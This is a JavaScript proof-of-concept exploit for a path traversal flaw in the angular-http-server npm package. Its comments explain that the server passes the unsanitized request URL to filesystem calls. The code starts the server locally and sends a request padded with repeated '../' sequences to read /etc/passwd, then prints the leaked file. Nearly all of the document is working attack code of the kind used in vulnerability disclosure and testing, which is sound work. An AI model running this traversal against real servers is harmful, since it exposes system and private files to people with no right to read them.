```javascript
// Path traversal exploit for angular-http-server
// The server takes `possibleFilename = req.url.slice(1)` directly from the
// client-controlled URL and passes it unsanitized into fs.stat/fs.readFileSync,
// allowing "../" sequences to escape the served directory and read arbitrary
// files from the filesystem.

const http = require("http");

// Requiring the package starts the HTTP server on port 8000 as a side effect.
require("./node_modules/angular-http-server");

// Give the server a moment to start listening, then send a traversal request.
setTimeout(() => {
    const target = "/etc/passwd";
    const traversal = "/" + "../".repeat(10) + target.slice(1);

    http.get({ host: "127.0.0.1", port: 8000, path: traversal }, (res) => {
        let body = "";
        res.on("data", (chunk) => (body += chunk));
        res.on("end", () => {
            console.log(`Status: ${res.statusCode}`);
            console.log("Response body (leaked file contents):");
            console.log(body);
            process.exit(0);
        });
    }).on("error", (err) => {
        console.error("Request failed:", err.message);
        process.exit(1);
    });
}, 500);
```
